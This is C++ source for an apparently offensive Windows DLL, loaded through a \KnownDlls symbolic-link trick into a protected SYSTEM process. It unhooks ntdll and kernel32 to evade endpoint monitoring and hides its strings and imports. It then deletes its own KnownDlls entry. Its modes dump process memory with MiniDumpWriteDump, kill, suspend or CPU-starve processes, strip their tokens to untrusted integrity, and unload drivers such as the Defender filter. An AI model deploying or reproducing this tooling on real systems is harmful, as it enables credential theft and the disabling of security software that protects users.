#include "dllexploit.h"

void DoStuff()
{
    LPWSTR pwszDllName = NULL;
    BOOL bSuccess = FALSE;

    WCHAR wszEventName[MAX_PATH] = { 0 };
    HANDLE hEvent = NULL;

    //
    // 1. Parse the command line
    //
    //    Then, we can parse the command line to get the ID of the process to dump and the path of
    //    the target dump file.
    //
    std::vector<const wchar_t*> dllsToUnhook
    {
        skCrypt(L"ntdll.dll"),
        skCrypt(L"kernel32.dll"),
        skCrypt(L"kernelbase.dll")
    };

    for (auto dll : dllsToUnhook)
    {
        if (!UnhookDll(dll))
        {
            DEBUGLOG(L"Failed to unhook one of the DLLs");
            return;
        }
    }
    ParseCommandLine();

    if (g_bDebug)
        LOGTOCONSOLE(L"DEBUG mode enabled\n");

    if (g_bDebug)
        LOGTOCONSOLE(L"PID=%d | File='%ws' | GUID='%ws'\n", g_dwProcessId, g_pwszDumpFilePath, g_pwszGuid);

    //
    // Signal first Event (DLL loaded)
    //
    StringCchPrintfW(wszEventName, MAX_PATH, skCrypt(L"Global\\%ws_DLL_LOADED"), g_pwszGuid);
    if (hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, wszEventName))
    {
        if (!SetEvent(hEvent))
            LOGLASTERROR(L"SetEvent");
        
        CloseHandle(hEvent);
    }
    else
        LOGLASTERROR(L"OpenEvent");

    if (g_bDebug)
        LOGTOCONSOLE(L"[*] DLL loaded.\n");
    
    //
    // 2. Do some cleanup
    //
    //    First things first, we need to delete the symbolic link that was created in \KnownDlls.
    //    As this code is executed as SYSTEM inside a PPL with the WindowsTCB protection level, it
    //    should not be a problem.
    //
    if (!GetCurrentDllFileName(&pwszDllName))
        goto end;

    if (!DeleteKnownDllEntry(pwszDllName))
        LOGTOCONSOLE(L"[-] Failed to delete KnownDll entry '%ws'\n", pwszDllName);
    else
    {
        if (g_bDebug)
            LOGTOCONSOLE(L"[*] KnownDll entry '%ws' removed.\n", pwszDllName);
    }

    //
    // 3. Dump the memory of the target process
    //
    //    Finally, dump the memmory of the target process using MiniDumpWriteDump.
    //
    switch (g_intExecutionMode)
    {
    case DUMP_MODE:
    {
        bSuccess = DumpProcessMemory(g_dwProcessId, g_pwszDumpFilePath);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws DumpProcessMemory: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case KILL_MODE:
    {
        bSuccess = KillProcess(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws KillProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }

    case SUSPEND_MODE:
    {
        bSuccess = SuspendProcess(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws SuspendProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case RESUME_MODE:
    {
        bSuccess = ResumeProcess(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws ResumeProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case JOB_KILL_MODE:
    {
        bSuccess = JobKillProcess(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws JobKillProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case JOB_SUPPRESS_MODE:
    {
        bSuccess = JobSuppressProcess(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws JobSuppressProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case SUICIDE_MODE:
    {
        bSuccess = SuicideProcess(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws SuicideProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case TOKEN_DOWNGRADE_MODE:
    {
        bSuccess = SandboxToken(g_dwProcessId);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws SuicideProcess: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }
    case DRIVER_UNLOAD_MODE:
    {
        bSuccess = DriverUnload(g_pwszDumpFilePath);
        if (g_bDebug)
            LOGTOCONSOLE(L"%ws DriverUnload: %ws\n", bSuccess ? L"[+]" : L"[-]", bSuccess ? L"SUCCESS" : L"FAILURE");
        break;
    }

    default:
    {
        if (g_bDebug)
            LOGTOCONSOLE(L"[-] Invalid option passed to the DLL!\n");
        goto end;
    }
    }


    if (bSuccess)
    {
        //
        // Signal second Event (dump success)
        //
        StringCchPrintfW(wszEventName, MAX_PATH, skCrypt(L"Global\\%ws_DUMP_SUCCESS"), g_pwszGuid);
        if (hEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, wszEventName))
        {
            if (!SetEvent(hEvent))
                LOGLASTERROR(L"SetEvent");
            CloseHandle(hEvent);
        }
        else
            LOGLASTERROR(L"OpenEvent");
    }

end:
    if (pwszDllName)
        LocalFree(pwszDllName);
}

void LogToConsole(LPCWSTR pwszFormat, ...)
{
    //
    // The process in which we load this DLL does not have a console so we need to attach to the 
    // parent process' console. To do so, we can call AttachConsole with the special value 
    // ATTACH_PARENT_PROCESS. Then, we can get the STDOUT handle. This handle is stored will be 
    // stored as a global variable so we need to initialize it only once.
    //
    if (g_hConsoleOutput == NULL)
    {
        AttachConsole(ATTACH_PARENT_PROCESS);
        if (!(g_hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE)))
            return;
    }

    //
    // Prepare otuput string and use WriteConsole instead of wprintf. This way, we can directly use
    // the STDOUT handle we got previously.
    //
    DWORD dwOutputStringSize = 0;
    LPWSTR pwszOutputString = NULL;
    va_list va;
    size_t offset = 0;

    va_start(va, pwszFormat);

    if (g_bDebug)
        dwOutputStringSize += (DWORD)wcslen(L"[DEBUG] (DLL) ") * sizeof(WCHAR);
    else
        dwOutputStringSize += (DWORD)wcslen(L"(DLL) ") * sizeof(WCHAR);
    dwOutputStringSize += _vscwprintf(pwszFormat, va) * sizeof(WCHAR) + 2; // \0
    pwszOutputString = (LPWSTR)LocalAlloc(LPTR, dwOutputStringSize);

    if (pwszOutputString)
    {
        if (g_bDebug)
            StringCchPrintf(pwszOutputString, dwOutputStringSize, L"[DEBUG] (DLL) ");
        else
            StringCchPrintf(pwszOutputString, dwOutputStringSize, L"(DLL) ");

        if (SUCCEEDED(StringCbLength(pwszOutputString, dwOutputStringSize, &offset)))
        {
            StringCbVPrintf(&pwszOutputString[offset / sizeof(WCHAR)], dwOutputStringSize - offset, pwszFormat, va);

            WriteConsole(g_hConsoleOutput, pwszOutputString, (DWORD)wcslen(pwszOutputString), NULL, NULL);
        }

        LocalFree(pwszOutputString);
    }

    va_end(va);
}

void LogLastError(LPCWSTR pwszFunctionName)
{
    DWORD dwLastError = GetLastError();
    if (dwLastError != ERROR_SUCCESS)
        LOGTOCONSOLE(L"Function '%ws' returned error code %d - %ws\n", pwszFunctionName, dwLastError, _com_error(HRESULT_FROM_WIN32(dwLastError)).ErrorMessage());
}

BOOL GetCurrentDllFileName(LPWSTR* ppwszDllName)
{
    WCHAR wszDllPath[MAX_PATH];
    LPWSTR pwszDllName = NULL;

    GetModuleFileName(g_hInstance, wszDllPath, MAX_PATH);
    if (GetLastError() == ERROR_SUCCESS)
    {
        pwszDllName = PathFindFileName(wszDllPath);
        *ppwszDllName = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
        if (*ppwszDllName)
        {
            StringCchPrintfW(*ppwszDllName, 64, skCrypt(L"%ws"), pwszDllName);
            return TRUE;
        }
    }

    return FALSE;
}

BOOL DeleteKnownDllEntry(LPCWSTR pwszDllName)
{
    BOOL bReturnValue = FALSE;

    NTSTATUS status = 0;
    HANDLE hLink = NULL;
    LPWSTR pwszLinkPath = NULL;
    UNICODE_STRING name = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    SECURITY_DESCRIPTOR sd = { 0 };
    SECURITY_ATTRIBUTES sa = { 0 };

    //
    // Build the path of the symbolic link object to delete. The name of the DLL can be determined
    // at runtime by invoking 'GetCurrentDllFileName'. The final path will be something such as 
    // '\KnownDlls\DPAPI.dll'.
    //
    pwszLinkPath = (LPWSTR)LocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszLinkPath)
        goto end;

    StringCchPrintfW(pwszLinkPath, MAX_PATH, skCrypt(L"\\KnownDlls\\%ws"), pwszDllName);

    if (g_bDebug)
        LOGTOCONSOLE(L"Object to delete: %ws\n", pwszLinkPath);

    RtlInitUnicodeString(&name, pwszLinkPath);
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, nullptr, nullptr);

    //
    // Here we want to call NtOpenSymbolicLinkObject with DELETE access because we want to delete
    // the link. Unfortunately, the inherited ACL does not grant us this right and we will thus 
    // get an "Access denied" error. What we can do though is open the symbolic link object with
    // WRITE_DAC access in order to change the ACL of the object.
    //
    status = NtOpenSymbolicLinkObject(&hLink, WRITE_DAC, &oa);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LOGLASTERROR(L"NtOpenSymbolicLinkObject");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"NtOpenSymbolicLinkObject('%ws', WRITE_DAC) OK\n", pwszLinkPath);

    //
    // Prepare the Security Descriptor. Here we will just use a NULL DACL. This will give everyone
    // access to the object but that's not really an issue because we'll delete it right after.
    //
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
#pragma warning( suppress : 6248 ) // Disable warning as setting a NULL DACL is intentional here
    if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE))
    {
        LOGLASTERROR(L"SetSecurityDescriptorDacl");
    }

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = FALSE;
    sa.lpSecurityDescriptor = &sd;

    //
    // Apply the new Security Descriptor.
    //
    if (!SetKernelObjectSecurity(hLink, DACL_SECURITY_INFORMATION, &sd))
    {
        LOGLASTERROR(L"SetKernelObjectSecurity");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"SetKernelObjectSecurity OK\n");

    //
    // At this point we can close the object handle because only the WRITE_DAC right is associated
    // to it. This handle will not allow us to delete the object.
    //
    status = NtClose(hLink);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LOGLASTERROR(L"NtClose");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"NtClose OK\n");

    //
    // This time, we should be able to open the link object with DELETE access.
    //
    status = NtOpenSymbolicLinkObject(&hLink, DELETE, &oa);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LOGLASTERROR(L"NtOpenSymbolicLinkObject");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"NtOpenSymbolicLinkObject('%ws', DELETE) OK\n", pwszLinkPath);

    //
    // Now, we can invoke NtMakeTemporaryObject to disable the "Permanent" flag of the object. When
    // an object does not have the "Permanent" flag enabled, it is automatically deleted when all 
    // its handles are closed.
    //
    status = NtMakeTemporaryObject(hLink);
    SetLastError(RtlNtStatusToDosError(status));
    if (status != 0)
    {
        LOGLASTERROR(L"NtMakeTemporaryObject");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"NtMakeTemporaryObject OK\n");

    bReturnValue = status == STATUS_SUCCESS;

    //
    // We should be the only process to have an opened handle on this object. So, if we close it, 
    // the link should be automatically deleted.
    //

end:
    if (hLink)
        NtClose(hLink);
    if (pwszLinkPath)
        LocalFree(pwszLinkPath);

    return bReturnValue;
}

BOOL ParseCommandLine()
{
    LPWSTR pwszCommandLine = GetCommandLineW();
    LPWSTR* argv = NULL;
    int argc = 0;
    int i = 0;

    argv = CommandLineToArgvW(pwszCommandLine, &argc);
    if (!argv)
        return FALSE;

    if (argc < 5)
        return FALSE;

    g_dwProcessId = wcstoul(argv[1], NULL, 10);
    g_intExecutionMode = wcstoul(argv[2], NULL, 10);
    g_pwszDumpFilePath = argv[3];
    g_pwszGuid = argv[4];

    if (argc > 5)
    {
        if (_wcsicmp(argv[5], skCrypt(L"-d")) == 0)
        {
            g_bDebug = TRUE;
        }
    }

    return TRUE;
}

bool UnhookDll(_In_ LPCWSTR lpszDllName)
{
    MODULEINFO mi = { 0 };
    DWORD oldProtection = 0;
    LPVOID dllBase = nullptr;
    wil::unique_handle dllFile;
    wil::unique_handle dllMapping;
    wil::unique_hmodule dllModule;
    LPVOID dllMappingAddress = nullptr;
    PIMAGE_DOS_HEADER hookedDosHeader = nullptr;
    PIMAGE_NT_HEADERS hookedNtHeader = nullptr;
    PIMAGE_SECTION_HEADER hookedSectionHeader = nullptr;
    bool isProtected = false;
    wchar_t lpszDllPath[MAX_PATH + 1] = { 0 };

    dllModule.reset(LI_FN(GetModuleHandleW)(lpszDllName));
    if (!dllModule)
    {
        LOGLASTERROR(L"UnhookDll");
        return false;
    }

    if (!LI_FN(GetModuleFileNameW)(dllModule.get(), lpszDllPath, MAX_PATH))
    {
        LOGLASTERROR(L"UnhookDll - ");
        return false;
    }

    if (!LI_FN(K32GetModuleInformation)(GetCurrentProcess(), dllModule.get(), &mi, (DWORD)sizeof(mi)))
    {
        LOGLASTERROR(L"UnhookDll - ");
        return false;
    }

    dllBase = (LPVOID)mi.lpBaseOfDll;
    if (!dllBase)
    {
        LOGLASTERROR(L"UnhookDll - ");
        return false;
    }

    dllFile.reset(CreateFileW(lpszDllPath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr));
    if (!dllFile.is_valid())
    {
        LOGLASTERROR(L"UnhookDll - ");
        return false;
    }

    dllMapping.reset(LI_FN(CreateFileMappingW)(dllFile.get(), nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr));
    if (!dllMapping.is_valid())
    {
        LOGLASTERROR(L"UnhookDll - ");
        return false;
    }

    dllMappingAddress = LI_FN(MapViewOfFile)(dllMapping.get(), FILE_MAP_READ, 0, 0, 0);
    if (!dllMappingAddress)
    {
        LOGLASTERROR(L"UnhookDll - ");
        return false;
    }

    hookedDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBase + hookedDosHeader->e_lfanew);

    for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
        hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (strcmp((char*)hookedSectionHeader->Name, skCrypt(".text")) == 0) {
            isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
            memcpy((LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)dllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
            isProtected = LI_FN(VirtualProtect)((LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
            DEBUGLOG(L"[+] Dll successfully unhooked!\n");
        }
    }

    return true;
}

BOOL SetPrivilege(HANDLE token, std::wstring privilege, bool enabled)
{
    TOKEN_PRIVILEGES tp{};
    LUID luid;

    auto result = LookupPrivilegeValueW(NULL, privilege.c_str(), &luid);

    if (!result)
    {
        DEBUGLOG(L"[-] Privilege not held\n");
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (enabled)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    result = AdjustTokenPrivileges(token, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
    if (!result)
    {
        if (enabled) DEBUGLOG(L"[-] Couldn't enable the privilege in the token\n");
        else DEBUGLOG(L"[-] Couldn't disable the privilege in the token\n");
        return false;
    }
    else
    {
        if (enabled) DEBUGLOG(L"[+] Successfully enabled the privilege in the token\n");
        else DEBUGLOG(L"[+] Successfully disabled the privilege in the token\n");
        return true;
    }
}

BOOL SetIntegrity(HANDLE hToken, std::wstring integrityLevel)
{
    TOKEN_MANDATORY_LABEL tml = { 0 };
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    PSID sid = nullptr;

    auto success = ConvertStringSidToSidW(integrityLevel.c_str(), &sid);
    if (!success)
    {
        DEBUGLOG(L"[-] Couldn't convert provided SID to SID structure\n");
    }
    tml.Label.Sid = sid;

    if (!SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(tml)))
    {
        DEBUGLOG(L"[-] Couldn't set token information\n");
        return false;
    }
    else return true;
}

BOOL SandboxToken(DWORD dwProcessId)
{
    std::vector<const wchar_t*> privs
    {
        skCrypt(L"SeAssignPrimaryTokenPrivilege"),
        skCrypt(L"SeBackupPrivilege"),
        skCrypt(L"SeDebugPrivilege"),
        skCrypt(L"SeChangeNotifyPrivilege"),
        skCrypt(L"SeImpersonatePrivilege"),
        skCrypt(L"SeIncreaseBasePriorityPrivilege"),
        skCrypt(L"SeIncreaseQuotaPrivilege"),
        skCrypt(L"SeLoadDriverPrivilege"),
        skCrypt(L"SeRestorePrivilege"),
        skCrypt(L"SeSecurityPrivilege"),
        skCrypt(L"SeShutdownPrivilege"),
        skCrypt(L"SeSystemEnvironmentPrivilege"),
        skCrypt(L"SeTakeOwnershipPrivilege"),
        skCrypt(L"SeTcbPrivilege")
    };

    wil::unique_handle hProcess(LI_FN(OpenProcess)(PROCESS_QUERY_LIMITED_INFORMATION, false, dwProcessId));
    if (!hProcess)
    {
        DEBUGLOG(L"[-] Failed to get a PROCESS_QUERY_LIMITED_INFORMATION handle to the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process\n");

    wil::unique_handle hToken;
    if (!OpenProcessToken(hProcess.get(), TOKEN_ALL_ACCESS, &hToken))
    {
        DEBUGLOG(L"[-] Failed to obtain a handle to the process' token, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully obtained a handle to the token of the process\n");

    for (auto priv : privs)
    {
        SetPrivilege(hToken.get(), priv, false);
    }

    if (!SetIntegrity(hToken.get(), L"S-1-16-0"))
    {
        DEBUGLOG(L"[-] Failed to downgrade the integrity of the token...\n");
        return false;
    }

    return true;
}

BOOL DumpProcessMemory(DWORD dwProcessId, LPWSTR pwszDumpFilePath)
{
    BOOL bReturnValue = FALSE;

    BOOL bFileCreated = FALSE;
    HANDLE hFile = NULL;
    HANDLE hProcess = NULL;
    DWORD dwLastError = 0;

    hFile = LI_FN(CreateFileW)(pwszDumpFilePath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        LOGLASTERROR(L"CreateFile");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"CreateFile('%ws') OK\n", pwszDumpFilePath);

    bFileCreated = TRUE;

    //
    // The process handle used by MiniDumpWriteDump requires only the flags PROCESS_VM_READ and
    // PROCESS_QUERY_INFORMATION.
    //
    if (!(hProcess = LI_FN(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId)))
    {
        LOGLASTERROR(L"OpenProcess");
        goto end;
    }

    if (g_bDebug)
        LOGTOCONSOLE(L"OpenProcess(%d) OK\n", dwProcessId);

    if (!(bReturnValue = MiniDumpWriteDump(hProcess, dwProcessId, hFile, MiniDumpWithFullMemory, nullptr, nullptr, nullptr)))
    {
        //
        // MiniDumpWriteDump sets the Last Error as a HRESULT, not a standard Win32 code... :/
        //
        dwLastError = GetLastError();
        LOGTOCONSOLE(L"[-] MiniDumpWriteDump failed with error code 0x%08x (%ws)\n", dwLastError, _com_error(dwLastError).ErrorMessage());
        goto end;
    }

    bReturnValue = TRUE;

end:
    if (hFile && hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);
    if (hProcess)
        CloseHandle(hProcess);
    if (!bReturnValue && bFileCreated)
        DeleteFile(pwszDumpFilePath); // If the dump failed, delete the file

    return bReturnValue;
}

BOOL KillProcess(DWORD dwProcessId)
{
    wil::unique_handle hProcess(LI_FN(OpenProcess)(PROCESS_TERMINATE, false, dwProcessId));
    if (!hProcess)
    {
        DEBUGLOG(L"[-] Failed to get a PROCESS_TERMINATE handle to the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process\n");

    if (!LI_FN(TerminateProcess)(hProcess.get(), 0))
    {
        LOGTOCONSOLE(L"[-] Failed to call TerminateProcess on the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully called TerminateProcess on the process\n");
    return true;
}

BOOL SuspendProcess(DWORD dwProcessId)
{
    NTSTATUS status = 0;
    pNtSuspendProcess NtSuspendProcess = nullptr;

    wil::unique_handle hProcess(LI_FN(OpenProcess)(PROCESS_SUSPEND_RESUME, false, dwProcessId));
    if (!hProcess)
    {
        DEBUGLOG(L"[-] Failed to get a PROCESS_SUSPEND_RESUME handle to the process exiting...\n");
        return false;
    }

    else DEBUGLOG(L"[+] Successfully got a handle to the process\n");

    status = pNtSuspendProcess(LI_FN(NtSuspendProcess).nt())(hProcess.get());
    if (status != STATUS_SUCCESS)
    {
        DEBUGLOG(L"[-] Failed to suspend the process, exiting...\n");
        return false;
    }

    else DEBUGLOG(L"[+] Successfully suspended the process\n");
    
    //Sleep(5000);
    //bReturnValue = ResumeProcess(dwProcessId);
    return true;
}

BOOL ResumeProcess(DWORD dwProcessId)
{
    NTSTATUS status = 0;
    pNtResumeProcess NtResumeProcess = nullptr;

    wil::unique_handle hProcess(LI_FN(OpenProcess)(PROCESS_SUSPEND_RESUME, false, dwProcessId));
    if(!hProcess)
    {
        DEBUGLOG(L"[-] Failed to get a PROCESS_SUSPEND_RESUME handle to the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process\n");

    status = pNtResumeProcess(LI_FN(NtResumeProcess).nt())(hProcess.get());
    if (status != STATUS_SUCCESS)
    {
        DEBUGLOG(L"[-] Failed to resume the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process\n");
    
    return true;
}

BOOL JobKillProcess(DWORD dwProcessId)
{
    wil::unique_handle jobObject(LI_FN(CreateJobObjectW)(nullptr, nullptr));
    wil::unique_handle targetProcess(LI_FN(OpenProcess)(PROCESS_SET_QUOTA | PROCESS_TERMINATE, false, dwProcessId));

    if (!jobObject || !targetProcess)
    {
        DEBUGLOG(L"[-] Failed to create job object or open handle to the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process and the job object we will use to kill it with\n");

    auto success = AssignProcessToJobObject(jobObject.get(), targetProcess.get());
    if (!success)
    {
        DEBUGLOG(L"[-] Failed to assign the process to the job object, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully assigned the process to the job object we will use to kill it with\n");

    success = LI_FN(TerminateJobObject)(jobObject.get(), 1337);
    if(!success) DEBUGLOG(L"[-] Failed to kill job object...\n");
    else DEBUGLOG(L"[+] Successfully killed the job object!\n");
    return success;
}

BOOL JobSuppressProcess(DWORD dwProcessId)
{
    wil::unique_handle jobObject(LI_FN(CreateJobObjectW)(nullptr, nullptr));
    wil::unique_handle targetProcess(LI_FN(OpenProcess)(PROCESS_SET_QUOTA | PROCESS_TERMINATE, false, dwProcessId));
    if (!jobObject || !targetProcess)
    {
        DEBUGLOG(L"[-] Failed to create job object or open handle to the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process and the job object we will use to suppress it with\n");

    JOBOBJECT_CPU_RATE_CONTROL_INFORMATION cpuRateInfo;
    cpuRateInfo.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_ENABLE | JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP;
    cpuRateInfo.CpuRate = 1;
    auto success = LI_FN(SetInformationJobObject)(jobObject.get(), JobObjectCpuRateControlInformation, &cpuRateInfo, (DWORD)sizeof(JOBOBJECT_CPU_RATE_CONTROL_INFORMATION));
    if (!success)
    {
        DEBUGLOG(L"[-] Failed to set job object's control information, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully set job object's control information\n");

    success = LI_FN(AssignProcessToJobObject)(jobObject.get(), targetProcess.get());
    if (!success)
    {
        DEBUGLOG(L"[-] Failed to assign the process to the job object, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully assigned the process to the job object, the process should now be frozen!\n");
    return success;
}

BOOL SuicideProcess(DWORD dwProcessId)
{
    wil::unique_handle targetProcess(LI_FN(OpenProcess)(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, dwProcessId));
    if (!targetProcess)
    {
        DEBUGLOG(L"[-] Failed to open a handle to the process, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully got a handle to the process\n");

    auto exitCode = 0;
    wil::unique_handle threadHandle(LI_FN(CreateRemoteThread)(targetProcess.get(), nullptr, NULL, (LPTHREAD_START_ROUTINE)exit, &exitCode, NULL, nullptr));
    if (!threadHandle)
    {
        DEBUGLOG(L"[-] Failed to spawn remote exit(0) thread, exiting...\n");
        return false;
    }
    else DEBUGLOG(L"[+] Successfully spawned remote exit(0) thread\n");
    
    auto waitStatusThread = LI_FN(WaitForSingleObject)(threadHandle.get(), 5000);
    if (waitStatusThread != WAIT_FAILED)
    {
        DEBUGLOG(L"[+] Process successfully committed harakiri!\n");
        return true;
    }
    else DEBUGLOG(L"[-] Process failed to commit harakiri...\n");
    return false;
}

BOOL DriverUnload(std::wstring driverName)
{
    wil::unique_handle processToken;
    auto success = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &processToken);
    if (!success)
    {
        DEBUGLOG(L"[-] Failed to open current thread token, exiting...\n");
        return false;
    }

    success = SetPrivilege(processToken.get(), L"SeLoadDriverPrivilege", true);
    if (!success)
    {
        DEBUGLOG(L"[-] Failed to enable SeLoadDriverPrivilege, exiting...\n");
        return false;
    }

    std::wstring driverPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + driverName;
    UNICODE_STRING wdfilterDrivServ;
    RtlInitUnicodeString(&wdfilterDrivServ, driverPath.c_str());
    auto status = NtUnloadDriver(&wdfilterDrivServ);
    if (status == STATUS_SUCCESS) DEBUGLOG(L"[+] Successfully unloaded driver!\n");
    else
    {
        DEBUGLOG(L"[-] Failed to unload the driver...\n");
        DEBUGLOG(driverPath.c_str());
        return false;
    }
    return true;
}